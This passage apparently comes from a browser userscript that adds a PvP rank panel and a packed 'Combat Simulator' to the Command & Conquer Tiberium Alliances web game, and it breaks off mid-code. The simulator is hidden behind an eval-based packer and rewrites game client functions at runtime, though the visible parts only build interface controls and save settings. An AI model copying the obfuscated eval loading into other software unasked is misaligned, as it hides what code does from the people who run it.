        function onPlayerChanged() { 
            try { 
                // Get Players AllianceId  
                if (playerName.getValue().length > 0) { 
                    ClientLib.Net.CommunicationManager.GetInstance().SendSimpleCommand("GetPublicPlayerInfoByName", { 
                        name: playerName.getValue() 
                    }, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, onPlayerAllianceIdReceived), null); 
                } 
            } catch (e) { 
                console.log("onPlayerChanged: ", e); 
            } 
        } 
 
 
 
        function onPlayerInfoWindowClose() { 
            try { 
                //dataTable.setData([]); 
            } catch (e) { 
                console.log("onPlayerInfoWindowClose: ", e); 
            } 
        } 
 
        function PvpRankMod_checkIfLoaded() { 
            try { 
                if (typeof qx !== 'undefined' && typeof qx.locale !== 'undefined' && typeof qx.locale.Manager !== 'undefined') { 
                    if (ClientLib.Data.MainData.GetInstance().get_Alliance().get_FirstLeaders() !== null && ClientLib.Data.MainData.GetInstance().get_Alliance().get_FirstLeaders().l.length != 0) { 
                        CreateMod(); 
                    } else { 
                        window.setTimeout(PvpRankMod_checkIfLoaded, 1000); 
                    } 
                } else { 
                    window.setTimeout(PvpRankMod_checkIfLoaded, 1000); 
                } 
            } catch (e) { 
                console.log("PvpRankMod_checkIfLoaded: ", e); 
            } 
        } 
 
        if (/commandandconquer\.com/i.test(document.domain)) { 
            window.setTimeout(PvpRankMod_checkIfLoaded, 1000); 
        } 
    } 
 
    try { 
        var PvpRankMod = document.createElement("script"); 
        PvpRankMod.innerHTML = "(" + PvpRankMod_main.toString() + ")();"; 
        PvpRankMod.type = "text/javascript"; 
        if (/commandandconquer\.com/i.test(document.domain)) { 
            document.getElementsByTagName("head")[0].appendChild(PvpRankMod); 
        } 
    } catch (e) { 
        console.log("PvpRankMod: init error: ", e); 
    } 
})();

/*******************************************
Combat Simulator
*******************************************/
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('nS.eZ=nR.cB.nQ;(1c(){1d p=7b.nT("cB");p.nU="("+1c(){1c d(d){1v{if(-1<w.4D(p)){1d q=z[d][w.4D(p)];2v""!==q?q:d}2v d}1u(E){2v 1j.1l(E),d}}1c q(){1v{if("3V"!==2E qx){1d x=qx.3h.3w.3v(),w=qx.3h.3w.3v().nW(),E=1e.1P.6k.2L(),z=1e.1Q.cr.2L();if(x&&w&&E&&z&&"3V"!==2E ax)if(10<G||"3V"!==2E 9u){qx.nV.nP("2m",{es:"nO",nJ:qx.3h.nI,nH:{1V:{bH:{9G:"nK"},5H:{9w:cG,9I:cG},3k:{3H:!0,3R:!0,3N:!1,3M:!1,3J:!1},4a:{em:!0},6e:{3s:1A}},17:{1a:{1B:{52:18,6t:18},2k:18,3F:18,1D:18,nL:18,5L:18,5S:18,5P:18,5W:18,2S:18,2Q:18,2R:18,3A:18,3E:18,3n:18,61:18,6q:18,5X:18,1f:18},2k:{5I:18,5B:18},55:18,4R:18,4V:18,4Y:18,6F:18},1g:{2W:{6G:18,6C:18,6D:18,5R:18},2h:{2y:18,2K:18,2I:18,1K:18},1D:{2y:18,2K:18,2I:18,1K:18,2a:18,5Z:18},2l:{8j:18,8k:18,7a:18,5b:18,8m:18},1q:{2r:{1K:18},1E:{3B:18,47:18,3L:18,4j:18,1K:18},1K:18},42:18,49:18},1i:{2h:{2y:18,2K:18,2I:18,1K:18},1D:{2a:18},2T:{2y:18,2K:18,2I:18,2a:18},2l:{2a:18},1q:{2r:{1K:18},1E:{3B:18,47:18,3L:18,4j:18,1K:18},1K:18,5M:18},42:18,49:18,4b:18},1Y:{4W:18,7C:18,nN:18,8C:18,5Q:18,bm:18,2p:18},1F:{3K:18,4p:18,3l:18,3f:18,9O:18},1f:{43:18,4i:18,9Z:18,9X:18,7i:18,3G:18,4t:18,4q:18,4g:18,4k:18,3H:18,3R:18,3N:18,7h:18,3s:18,7m:18,3M:18,3J:18},4a:{4J:18,4O:18},3r:18,1O:18,nM:18,3d:18,cW:18,6a:18,4l:18,1N:18,nX:18,nY:18,2g:18,2V:18,3X:18,a1:18,57:18,9z:18,7L:18,5u:18,6s:18,2i:18,o9:18,o8:18,oa:18,ob:18,1I:18,a0:od,96:c5,4T:c7,2w:18,2U:[],78:18,4L:18,7s:18,9i:18,5n:18,dh:18,oc:18,4M:[],8Q:18,8P:18,bX:1c(){1d b=1C.er("2m");if(18!=b){1d b=1Z.2F(b),a;24(a in 14.1V)if("9v"==2E b[a])24(1d c in 14.1V[a])"9v"!=2E b[a][c]&&"3V"==2E b[a][c]&&(1j.1l("cp cq 52 9G: "+a+"."+c),b[a][c]=14.1V[a][c]);3q"3V"==2E b[a]&&(1j.1l("cp cq 9G bH: "+a),b[a]=14.1V[a]);14.1V=b;14.6o()}},6o:1c(){1d b=14.1V||2d.2m.2j().1V,b=1Z.3g(b);1C.o7("2m",b)},aA:1c(){1v{14.bX();p=qx.o6.8s.2j().o1();14.5Q="0";14.3r=qx.3h.3w.3v();14.1O=1e.1Q.cr.2L();14.3d=1e.1P.6k.2L();14.cW=14.3d.dk();14.6a=14.3r.4v();14.4l=14.3r.o0();14.1N=14.3r.a6(1e.1Q.a7.a4.nZ);31.36.2n.9t(1e.3Y.5V.2L(),"d7",1e.3Y.d7,14,14.7G);31.36.2n.9t(14.3d,"d4",1e.1P.d4,14,14.eS);31.36.2n.9t(14.1O.2z(),"df",1e.1Q.o2,14,14.dl);14.17.2k.5I=19 qx.ui.1w.1U(d("56"));14.17.2k.5I.1s({1G:80,1T:"1X-1R-1W",1S:d("9g to 4A 56")});14.17.2k.5I.1o("1H",14.ei,14);14.17.2k.5B=19 qx.ui.1w.1U(d("o3"));14.17.2k.5B.1s({1G:50,2e:21,1T:"1X-1R-1W",1S:d("7e to fD")});14.17.2k.5B.1o("1H",14.eC,14);1d b=14.3r.o5();b.1b(14.17.2k.5I,{1M:12,2f:nG});"3V"!=2E 9u&&9u&&b.1b(14.17.2k.5B,{1M:38,2f:ni});14.17.1a.3F=19 qx.ui.1w.1U(d("4d"));14.17.1a.3F.1s({1G:45,2e:45,3y:0,1T:"1X-1R-1W",1S:d("4d 4o 1U")});14.17.1a.3F.1o("1H",14.dM,14);14.17.1a.3F.2X(0.5);1d a=1C.6b;(a=a?1Z.2F(1C.6b):!0)&&14.1N.1b(14.17.1a.3F,{1M:b1,26:9});14.17.1a.1D=19 qx.ui.1w.1U(d("4d"));14.17.1a.1D.1s({1G:45,2e:45,3y:0,1T:"1X-1R-1W",1S:d("4d 3b 1U")});14.17.1a.1D.1o("1H",14.dK,14);14.17.1a.1D.2X(0.5);(a=(a=1C.6d)?1Z.2F(1C.6d):!0)&&14.1N.1b(14.17.1a.1D,{1M:16,26:9});1d c=1e.1Q.nh.2b;c.7M||(c.7M=c.4K);c.4K=1c(a){14.7M(a);2d.2m.2j().8L()};c.9y||(c.9y=c.9L);c.9L=1c(a,b){1d c=2d.2m.2j();if(c.1f.4k.1k()&&2<=c.4L&&14.4E()===a&&14.4w()===b){1d e=14.65();14.7M(e^1)}14.9y(a,b);c.8L();c.4L=0;6z(c.7s)};14.aY();14.2V=(19 qx.ui.2d.59(d("4Z"),"3S/2Z/8R.1J")).1s({9V:1,9U:8,9T:8,9W:8,1G:cD,2e:cD,cO:!1,cK:!1,cJ:!1,cF:!1,bF:!1});14.2V.cH("2Y").1s({aI:!0,1G:25,2e:25});14.2V.2c(19 qx.ui.1B.41);1d e=1C.9x;if(e){1d e=1Z.2F(1C.9x),h=1Z.2F(1C.cL);14.2V.aQ(h,e)}3q 14.2V.8w();14.2V.1o("7n",1c(){1C.9x=1Z.3g(14.2V.cM().1M);1C.cL=1Z.3g(14.2V.cM().2f);14.6o()},14);14.2g=(19 qx.ui.2d.59("2m","3S/2Z/ng.1J")).1s({9V:0,9U:2,9T:2,9W:6,cO:!1,cK:!1,cJ:!1,cF:!1,bF:!1});14.2g.cH("2Y").1s({aI:!0,1G:20,2e:20,nj:"4r"});14.2g.2c(19 qx.ui.1B.9K);14.2g.aQ(14.1V.5H.9w,14.1V.5H.9I);14.2g.1o("nk",1c(){14.1V.5H.9w=14.2g.5i().2f;14.1V.5H.9I=14.2g.5i().1M;14.6o()},14);14.2g.1o("76",1c(){14.2g.2X(14.1V.6e.3s/1A)},14);1d f=(19 qx.ui.6x.nl).1s({9V:3,9U:6,9T:7,9W:3});14.2g.1b(f);14.aq(f);14.bw(f);14.b6(f);14.f2();14.6I();14.71(1e.1P.6Z.6Q);14.71(1e.1P.6Z.al);14.71(1e.1P.6Z.nf);14.dX()}1u(g){1j.1l(g)}},aq:1c(b){1v{14.3X=19 qx.ui.6x.9P(d("2J"));14.3X.2c(19 qx.ui.1B.41(1));b.1b(14.3X);1d a=19 qx.ui.2t.2s,c=19 qx.ui.1B.4n;c.4I(0,"2f","4r");c.4I(1,"26","4r");c.51(0,1);c.ne(0,15);a.2c(c);a.3i("3j");a.39("#3a");14.3X.1b(a);14.1i.4b=19 qx.ui.1p.1y("");14.1i.4b.1s({1G:0,2e:10,n8:5,f3:"#n7"});a.1b(14.1i.4b,{1m:0,1n:0});a=19 qx.ui.2t.2s;c=19 qx.ui.1B.4n;c.4I(1,"26","4r");c.51(0,1);a.2c(c);a.3i("3j");a.39("#3a");14.3X.1b(a);a.1b(19 qx.ui.1p.1y(d("cR 1z:")),{1m:0,1n:0});14.1i.1q.1K=19 qx.ui.1p.1y("1A");a.1b(14.1i.1q.1K,{1m:0,1n:1});a.1b(19 qx.ui.1p.1y(d("cY:")),{1m:1,1n:0});14.1i.1q.2r.1K=19 qx.ui.1p.1y("1A");a.1b(14.1i.1q.2r.1K,{1m:1,1n:1});a.1b(19 qx.ui.1p.1y(d("cs:")),{1m:2,1n:0});14.1i.1q.1E.1K=19 qx.ui.1p.1y("1A");a.1b(14.1i.1q.1E.1K,{1m:2,1n:1});a.1b(19 qx.ui.1p.1y(d("9e bT:")),{1m:3,1n:0});14.1i.1q.1E.3B=19 qx.ui.1p.1y("1A");a.1b(14.1i.1q.1E.3B,{1m:3,1n:1});a.1b(19 qx.ui.1p.1y(d("9d c1:")),{1m:4,1n:0});14.1i.1q.1E.47=19 qx.ui.1p.1y("1A");a.1b(14.1i.1q.1E.47,{1m:4,1n:1});a.1b(19 qx.ui.1p.1y(d("bJ bI:")),{1m:5,1n:0});14.1i.1q.1E.3L=19 qx.ui.1p.1y("1A");a.1b(14.1i.1q.1E.3L,{1m:5,1n:1});14.1i.49=19 qx.ui.1p.1y("");a.1b(14.1i.49,{1m:6,1n:0});14.1i.1q.1E.4j=19 qx.ui.1p.1y("");a.1b(14.1i.1q.1E.4j,{1m:6,1n:1});a=19 qx.ui.2t.2s;c=19 qx.ui.1B.4n;c.4I(1,"26","4r");c.51(0,1);a.2c(c);a.3i("3j");a.39("#3a");14.3X.1b(a);a.1b(19 qx.ui.1p.1y(d("ch:")),{1m:0,1n:0});14.1i.2h.1K=19 qx.ui.1p.1y("1A");a.1b(14.1i.2h.1K,{1m:0,1n:1});a.1b(19 qx.ui.1p.1y(d("4c:")),{1m:1,1n:0});14.1i.2h.2y=19 qx.ui.1p.1y("1A");a.1b(14.1i.2h.2y,{1m:1,1n:1});a.1b(19 qx.ui.1p.1y(d("94:")),{1m:2,1n:0});14.1i.2h.2K=19 qx.ui.1p.1y("1A");a.1b(14.1i.2h.2K,{1m:2,1n:1});a.1b(19 qx.ui.1p.1y(d("93:")),{1m:3,1n:0});14.1i.2h.2I=19 qx.ui.1p.1y("1A");a.1b(14.1i.2h.2I,{1m:3,1n:1});a=19 qx.ui.2t.2s;c=19 qx.ui.1B.4n;c.4I(1,"26","4r");c.51(0,1);a.2c(c);a.3i("3j");a.39("#3a");14.3X.1b(a);a.1b(19 qx.ui.1p.1y(d("c6:")),{1m:0,1n:0});14.1i.1q.5M=19 qx.ui.1p.1y(d("ca"));a.1b(14.1i.1q.5M,{1m:0,1n:1});a.1b(19 qx.ui.1p.1y(d("73 8q:")),{1m:1,1n:0});14.1i.42=19 qx.ui.1p.1y("fA");a.1b(14.1i.42,{1m:1,1n:1});a=19 qx.ui.2t.2s;c=19 qx.ui.1B.4n;c.4I(1,"26","4r");c.51(0,1);a.2c(c);a.3i("3j");a.39("#3a");14.3X.1b(a);a.1b(19 qx.ui.1p.1y(d("7A 3b:")),{1m:0,1n:0});14.1i.1D.2a=19 qx.ui.1p.1y("9Y:9Y:9Y");a.1b(14.1i.1D.2a,{1m:0,1n:1});a.1b(19 qx.ui.1p.1y(d("7A cj:")),{1m:1,1n:0});14.1i.2l.2a=19 qx.ui.1p.1y("CP:- / FR:- / n9:-");a.1b(14.1i.2l.2a,{1m:1,1n:1})}1u(e){1j.1l(e)}},bw:1c(b){1v{1d a=19 qx.ui.6x.9P(d("8n"));a.2c(19 qx.ui.1B.41);b.1b(a);14.1F.4p=19 qx.ui.1w.nb;14.1F.4p.1s({2e:nd,nc:"nn"});a.1b(14.1F.4p);1d c=19 qx.ui.2t.2s;c.2c(19 qx.ui.1B.9K(5));14.17.1a.1B.6t=19 qx.ui.1w.1U(d("7P"));14.17.1a.1B.6t.1s({1G:80,1T:"1X-1R-1W",1S:d("7P 14 5d 1B.")});14.17.1a.1B.6t.1o("1H",14.ct,14);c.1b(14.17.1a.1B.6t);14.6y=19 qx.ui.1w.1U(d("7v"));14.6y.1s({1G:80,1T:"1X-1R-1W",1S:d("7v 14 5d 1B.")});14.6y.1o("1H",14.cx,14);c.1b(14.6y);a.1b(c);1d e=19 qx.ui.2t.2s;e.2c(19 qx.ui.1B.41(1));e.3i("3j");e.6j(2);e.39("#3a");1d h=19 qx.ui.2t.2s;h.2c(19 qx.ui.1B.9K(5));h.1b(19 qx.ui.1p.1y(d("8f: ")));14.1F.3K=19 qx.ui.1w.nA;14.1F.3K.1r("");h.1b(14.1F.3K);e.1b(h);14.17.1a.1B.52=19 qx.ui.1w.1U(d("7F"));14.17.1a.1B.52.1s({1G:80,1T:"1X-1R-1W",1S:d("7F 14 1B.")});14.17.1a.1B.52.1o("1H",14.aP,14);e.1b(14.17.1a.1B.52);a.1b(e)}1u(f){1j.1l(f)}},b6:1c(b){1v{1d a=19 qx.ui.6x.9P(d("4u"));a.2c(19 qx.ui.1B.41(1));b.1b(a);1d c=19 qx.ui.2t.2s;c.2c(19 qx.ui.1B.41(1));c.3i("3j");c.6j(2);c.39("#3a");a.1b(c);1d e=(19 qx.ui.1p.1y).1s({fz:"<a eR=\'dN\' dJ=\'6Y://dQ.dY/e1/dW/dS\'>"+d("6f")+"</a>",ds:!0});c.1b(e);1d h=19 qx.ui.2t.2s;h.2c(19 qx.ui.1B.41(1));h.3i("3j");h.6j(2);h.39("#3a");a.1b(h);h.1b(19 qx.ui.1p.1y(d("c4")));14.1g.2W.6G=19 qx.ui.1p.6A("0","2C/ui/6B/nB.1J");h.1b(14.1g.2W.6G);14.1g.2W.6C=19 qx.ui.1p.6A("0","2C/ui/6B/nC.1J");h.1b(14.1g.2W.6C);14.1g.2W.6D=19 qx.ui.1p.6A("0","2C/ui/6B/nE.1J");h.1b(14.1g.2W.6D);14.1g.2W.5R=19 qx.ui.1p.6A("0","2C/ui/6B/nD.1J");h.1b(14.1g.2W.5R);1d f=19 qx.ui.2t.2s,g=19 qx.ui.1B.4n;f.2c(g);f.3i("3j");f.39("#3a");a.1b(f);14.17.6F=(19 qx.ui.1w.1U).1s({2e:25,1G:aa,nx:15,nw:"8w",3K:d("4Z"),1T:"1X-1R-1W",2Y:"3S/2Z/8R.1J",1S:d("2m 4Z")});14.17.6F.1o("1H",14.8M,14);f.1b(14.17.6F,{1m:0,1n:0});14.2g.1b(b)}1u(j){1j.1l(j)}},f2:1c(){1v{1d b=19 qx.ui.2t.2s;b.2c(19 qx.ui.1B.41(1));b.6j(10);b.39("#3a");14.2V.1b(b);1d a=19 qx.ui.2t.2s,c=19 qx.ui.1B.4n(5,5);c.51(2,1);a.2c(c);a.3i("3j");a.39("#3a");b.1b(a);a.1b(19 qx.ui.1p.1y(d("dV: ")+2d.eZ),{1m:0,1n:0,3e:3});14.1f.43=19 qx.ui.1w.3u(d("7D cg 1g"));1d e=1C.8E;e?(e=1Z.2F(1C.8E),14.1f.43.1r(e)):14.1f.43.1r(!0);14.1f.43.1o("1H",14.bt,14);a.1b(14.1f.43,{1m:1,1n:0,3e:3});14.1f.4g=19 qx.ui.1w.3u(d("dF 5d dE on dn dp"));(e=1C.9R)?(e=1Z.2F(1C.9R),14.1f.4g.1r(e)):14.1f.4g.1r(!0);14.1f.4g.1o("1H",1c(){1C.9R=1Z.3g(14.1f.4g.1k())},14);a.1b(14.1f.4g,{1m:2,1n:0,3e:3});14.1f.4k=19 qx.ui.1w.3u(d("dr \'dm-1H to (De)dg 2r\'"));(e=1C.9S)?(e=1Z.2F(1C.9S),14.1f.4k.1r(e)):14.1f.4k.1r(!0);14.1f.4k.1o("1H",1c(){1C.9S=1Z.3g(14.1f.4k.1k())},14);a.1b(14.1f.4k,{1m:3,1n:0,3e:3});14.1f.4i=19 qx.ui.1w.3u(d("5o ci 17"));(e=1C.5y)?(e=1Z.2F(1C.5y),14.1f.4i.1r(e)):14.1f.4i.1r(!0);14.1f.4i.1o("1H",14.bB,14);a.1b(14.1f.4i,{1m:4,1n:0,3e:3});14.1f.9Z=19 qx.ui.1p.1y(d("ao:"));14.1f.7i=19 qx.ui.1w.eW(d("at"));14.1f.3G=19 qx.ui.1w.eW(d("aT"));1d h=19 qx.ui.1w.np;h.1b(14.1f.7i,14.1f.3G);(e=1C.a8)?(e=1Z.2F(1C.a8),14.1f.3G.1r(e)):14.1f.3G.1r(!0);h.1o("ns",14.6I,14);a.1b(14.1f.9Z,{1m:5,1n:0});a.1b(14.1f.7i,{1m:5,1n:1});a.1b(14.1f.3G,{1m:5,1n:2});14.1f.9X=19 qx.ui.1p.1y(d("bj:"));14.1f.4t=19 qx.ui.1w.3u(d("4o"));(e=1C.6b)?(e=1Z.2F(1C.6b),14.1f.4t.1r(e)):14.1f.4t.1r(!0);14.1f.4q=19 qx.ui.1w.3u(d("3b"));(e=1C.6d)?(e=1Z.2F(1C.6d),14.1f.4q.1r(e)):14.1f.4q.1r(!0);14.1f.4t.1o("1H",14.bA,14);14.1f.4q.1o("1H",14.aZ,14);a.1b(14.1f.9X,{1m:6,1n:0});a.1b(14.1f.4t,{1m:6,1n:1});a.1b(14.1f.4q,{1m:6,1n:2});14.1f.3H=19 qx.ui.1w.3u(d("5o 2J 7f 4o"));14.1f.3H.5e="3H";14.1f.3H.1r(14.1V.3k.3H);14.1f.3H.1o("1H",14.5s,14);a.1b(14.1f.3H,{1m:7,1n:0,3e:3});14.1f.3R=19 qx.ui.1w.3u(d("5o 2J 7f 3W"));14.1f.3R.5e="3R";14.1f.3R.1r(14.1V.3k.3R);14.1f.3R.1o("1H",14.5s,14);a.1b(14.1f.3R,{1m:8,1n:0,3e:3});14.1f.3N=19 qx.ui.1w.3u(d("7e 5l-dD dz 73"));14.1f.3N.5e="3N";14.1f.3N.1r(14.1V.3k.3N);14.1f.3N.1o("1H",14.5s,14);a.1b(14.1f.3N,{1m:9,1n:0,3e:3});2C.3Z.7W.fk.2j().1o("76",1c(){14.1V.3k.3N&&2C.3Z.7W.fk.2j().nv()},14);14.1f.3J=19 qx.ui.1w.3u(d("70 74 In 4o ew ex"));14.1f.3J.5e="3J";14.1f.3J.1r(14.1V.3k.3J);14.1f.3J.1o("1H",14.5s,14);a.1b(14.1f.3J,{1m:10,1n:0,3e:3});14.1f.3M=19 qx.ui.1w.3u(d("70 5k 74 In e3 72 8s"));14.1f.3M.5e="3M";14.1f.3M.1r(14.1V.3k.3M);14.1f.3M.1o("1H",14.5s,14);a.1b(14.1f.3M,{1m:11,1n:0,3e:3});14.1f.7h=19 qx.ui.1p.1y(d("2J 59 dw"));14.1f.7h.nu(10);a.1b(14.1f.7h,{1m:12,1n:0,3e:3});14.1f.3s=19 qx.ui.1w.oe;a.1b(14.1f.3s,{1m:13,1n:1,3e:2});14.1f.3s.1r(14.1V.6e.3s);14.1f.7m=19 qx.ui.1p.1y(f1(14.1V.6e.3s));a.1b(14.1f.7m,{1m:13,1n:0});14.1f.3s.1o("5j",1c(){1d a=14.1f.3s.1k();14.2g.2X(a/1A);14.1f.7m.1r(f1(a)+"%");14.1V.6e.3s=a},14);1d f=19 qx.ui.2t.2s;f.2c(19 qx.ui.1B.41(1));f.3i("3j");f.6j(10);f.39("#3a");b.1b(f);1d g=(19 qx.ui.1p.1y).1s({fz:"<a eR=\'dN\' dJ=\'6Y://dQ.dY/e1/dW/dS\'>"+d("6f")+"</a>",ds:!0});f.1b(g)}1u(j){1j.1l(j)}},5s:1c(b){b=b.p5();1d a=b.1k();14.1V.3k[b.5e]=a;14.6o()},71:1c(b){1v{1d a=b.2b,c;24(c in a)if("1c"===2E a[c]&&(e=a[c].28(),-1<e.4D("oU"))){c=/[A-Z]{6}\\=\\(19 \\$I.[A-Z]{6}\\).[A-Z]{6}\\(\\$I.[A-Z]{6}.aM/;1d e=e.6n(c).28(),d=e.4P(0,6);if(b===1e.1P.6Z.6Q){1d f="2v "+e.4P(12,21)+".2b."+e.4P(23,29)+".28();",g=5w("",f),e=g();c=/.I.[A-Z]{6}.2b.[A-Z]{6}/;1d j=e.6n(/.I.[A-Z]{6}.2b/).28(),e=e.6n(c).28(),f="2v "+e+".28();",g=5w("",f),e=g(),k=e.6n(/14.[A-Z]{6}=a/).28(),k="14."+k.4P(5,11)+"=a;",m=e.6n(/14.[A-Z]{6}\\(\\)/).28(),m="14."+m.4P(5,13)+";",l=j+".8U = 1c(a){"+k+m+"};9A.6U = 1c(){2v 14."+d+";}"}3q l="9A.6U = 1c(){2v 14."+d+";}";g=5w("9A",l);g(a);22}}1u(y){1j.1l(y)}},c9:1c(){1v{1d b=14.6a.3p().5i(),a=14.6a.3p().5i().1G;14.6a.1o("9E",1c(){14.1I.5x()&&(14.2D.2O(),14.1I.9C({4Q:14.a0}),14.1I.33(1))},14);14.4l.1o("76",1c(){14.4l.33(3);14.1I.2O();14.2D.2O()},14);14.4l.1o("oV",1c(){14.4l.5x()||(14.1I.5U(),14.2D.5U())},14);14.2D.1o("9E",1c(){1d c=b.1G;if(a!==c&&(a=c,c=14.4l.5i()))14.1I.eP(c.2f+(c.1G-14.4T)/2),14.2D.eP(c.2f+(c.1G-14.4T)/2);14.2D.5U();14.1I.33(11);14.1I.9C({4Q:14.96})},14);14.1I.1o("76",1c(){14.1I.33(1)},14);14.1N.1o("9E",1c(){14.2D.2O();14.1I.33(1);14.1I.9C({4Q:14.a0})},14);14.1N.1o("1H",1c(){14.4L+=1;1==14.4L&&(14.7s=9k(14.b0,8o))},14)}1u(c){1j.1l(c)}},6I:1c(){1v{1C.a8=1Z.3g(14.1f.3G.1k());1d b=14.3r.a6(1e.1Q.a7.a4.e4),a=14.3r.a6(1e.1Q.a7.a4.e4).3p().3p().5i().1G;14.4L=0;37(14.1O.8G().bn()){1x 1e.1z.5c.8N:1d c="2o:2G/1J;2A,oY+oX+p7+p8/8/pj/pi+pk/pm/po/pn/ph+pg/pb+pa+p9/pc+pd/pf+/pe/oR+oQ+O+ou+ot/os/ov+ow+oy/ox/or/oq/oj/oi/oh/ok+ol/oo/om/oz/oA+oL/oK/oM+oN+oP+oO/oJ+oI+oD+oC/C/oB+/oE/oF",e="2o:2G/1J;2A,oH/oG+n5/n4+/ly/lx+lw/lz/lA/lC++lB/lv+lu+lp+lo+ln/lq/lr+lt+/ls+lD+lE/lP/lO//lQ+lR+lT/lS/lN+lM+/lH+lG/lF/lI%3D%3D",h="2o:2G/1J;2A,lJ/lL+lK+lm/ll//+kX+kW+kV/F2/kY+kZ/l1+l0/kU/kT+kO+kN+kM+kP/kQ/kS/kR+l2+e+l3+lg+lf/lh+ux/li+lk+lj/ld+lc++e+Dx+l6+a+l5/l4+l7/l8/lb+l9/lU+lV/mI+mH/mJ/mK+mM+mL+mG+34//mF/4C/mA%3D%3D",f="2o:2G/1J;2A,mz///my/mB/mC+mE+mD/mN+mO+mZ++mY/n0+n1/n3/n2/mX+mW/mR+mQ+mP+mS+mT+mV/mU+mx/mw/m7/m6//m5/m8+m9/mb/ma/m4+F+m3/lY/G+lX/lW/lZ+m0/m2",g="2o:2G/1J;2A,m1////mc+md/mp+mo+/mq+mr+mv+mu/mn++ml/mg+mf/me+mh+mi/6S/mk+mj";22;1x 1e.1z.5c.8O:c="2o:2G/1J;2A,pp/pq/su/st/ss+sv+sw+sy/sx+sr+sq/sl/sk/sj+sm+f0+sn/sp+/S/6+so/B/sz/sA/sL+sK+sM+sN/sP+sO/sJ/sI+sD+sC+sB+sE/sF/sH+h/sG/si+sg/rT+rS+rR/69+rU/rV/rX+rW/rQ+rP+rK+rJ+rI+rL+rM+rO+rN/rY/c/rZ+sb//s9/sc/sd/sf/se%3D",e="2o:2G/1J;2A,s8+s7+cc+Z//s2/s1/s0/s3/s4+s6/s5/sQ+sR+tE/tD/tF+tG/tJ/tI/tC+tB/tv/tt+ts/tw/tx/tA/tz/tK/tL///tW+tV/tX+tY++u0+tZ+tU/tT+tO+tN/tM+tP+tQ/tS+tR+tr+tq/t3+t2+t1/t4/t5+t7+t6/4/x/t0%3D",h="2o:2G/1J;2A,sZ+sU+n/sT+sS/M+z/sV/sW+sY+sX+t8/t9++tk/tj+U/tl+/tm+/tp/tn+ti/th+tc+L/tb+ta/td/te/tg/tf+m/rH+s/rG/qc/qb+/qa+qd/qe/qg/qf+q9/q8+q3+q2/q1/q4+q5/q7+q6+qh/qi+qt+X+qs/qu+qv+qy+qw/qr/R//qq",f="2o:2G/1J;2A,ql///+qk/qj+qm+qn/qp/qo+/q0+pZ+pD+pC+pB+pE+pF+/pH/pG/pA+pz+pu+ps+/pr/pv/pw/py/kL/pI+pJ/pU+pT+pV+pW+pY//pX/pS/pR+pM+/pL/pK/pN+pO%3D",g="2o:2G/1J;2A,pQ////pP/qz+qA+rk/rj++rl+rm+ro//rn+ri/rh/rc+rb+ra+rd/re+rg+rf/rp+rq/rB%3D%3D"}14.1I&&14.1N.3p().3p().2M(14.1I);14.2w&&b.2M(14.2w);14.2w=19 qx.ui.2t.2s;1d j=19 qx.ui.1B.4n;j.4I(0,"26","4r");14.2w.2c(j);14.2w.3i("3j");14.2w.1s({97:!1});14.2w.1b(19 qx.ui.1p.6r("2C/ui/2Z/rF.1J"),{1m:0,1n:1});14.1i.2T.2a=(19 qx.ui.1p.1y("1A")).1s({7t:"7I"});14.2w.1b(14.1i.2T.2a,{1m:0,1n:0});14.2w.1b(19 qx.ui.1p.6r("2C/ui/2Z/rE.1J"),{1m:1,1n:1});14.1i.2T.2y=(19 qx.ui.1p.1y("1A")).1s({7t:"7I"});14.2w.1b(14.1i.2T.2y,{1m:1,1n:0});14.2w.1b(19 qx.ui.1p.6r("2C/ui/2Z/rz.1J"),{1m:2,1n:1});14.1i.2T.2K=(19 qx.ui.1p.1y("1A")).1s({7t:"7I"});14.2w.1b(14.1i.2T.2K,{1m:2,1n:0});14.2w.1b(19 qx.ui.1p.6r("2C/ui/2Z/ry.1J"),{1m:3,1n:1});14.1i.2T.2I=(19 qx.ui.1p.1y("1A")).1s({7t:"7I"});14.2w.1b(14.1i.2T.2I,{1m:3,1n:0});b.1b(14.2w,{4Q:aK,26:3});14.1I=19 qx.ui.2t.2s;14.1I.2c(19 qx.ui.1B.8W);14.1I.8V(53);14.1I.4N(14.4T);14.1I.1s({7X:(19 qx.ui.88.8b).1s({bp:"3S/ru/rv/rx.1J"}),97:!1});14.1N.3p().3p().1b(14.1I,{4Q:14.96,2f:(a-14.4T)/2,97:!1});14.2D=19 qx.ui.2t.2s;14.2D.2c(19 qx.ui.1B.8W);14.2D.8V(25);14.2D.4N(c7);14.1N.3p().3p().1b(14.2D,{4Q:c5,2f:(a-14.4T)/2});14.2D.5U();14.2D.r8("#qM");14.2D.2X(0);14.2D.33(10);14.c9();14.17.1a.3A=19 qx.ui.1w.5N("","3S/2Z/qK.1J");14.17.1a.3A.1s({1G:44,2e:40,3y:0,2O:"2Y",1T:"1X-1R-1W",1S:"<1t>"+d("2P 5G")+"</1t>"});14.17.1a.3A.1o("5j",1c(){1d a=14.17.1a.3A;a.1k()?(a.2X(0.75),a.3Q("<1t>"+d("3x 5G")+"</1t>")):(a.2X(1),a.3Q("<1t>"+d("2P 5G")+"</1t>"))},14);14.17.1a.3A.1o("7k",1c(){1d a=14.17.1a.3A;14.17.1a.2S.1k()!==a.1k()&&14.17.1a.2S.1r(a.1k());14.17.1a.2Q.1k()!==a.1k()&&14.17.1a.2Q.1r(a.1k());14.17.1a.2R.1k()!==a.1k()&&14.17.1a.2R.1r(a.1k())},14);14.17.1a.2S=19 qx.ui.1w.5N("","3S/2Z/qN.1J");14.17.1a.2S.1s({1G:44,2e:40,1T:"1X-1R-1W",1S:"<1t>"+d("2P 4c")+"</1t>"});14.17.1a.2S.1o("5j",1c(){1d a=14.17.1a.2S;a.1k()===14.17.1a.2Q.1k()&&a.1k()===14.17.1a.2R.1k()&&14.17.1a.3A.1r(a.1k());14.7j("2y",!a.1k());a.1k()?(a.2X(0.75),a.3Q("<1t>"+d("3x 4c")+"</1t>")):(a.2X(1),a.3Q("<1t>"+d("2P 4c")+"</1t>"))},14);14.17.1a.2Q=19 qx.ui.1w.5N("","3S/2Z/qO.1J");14.17.1a.2Q.1s({1G:44,2e:40,1T:"1X-1R-1W",1S:"<1t>"+d("2P 5z")+"</1t>"});14.17.1a.2Q.1o("5j",1c(){1d 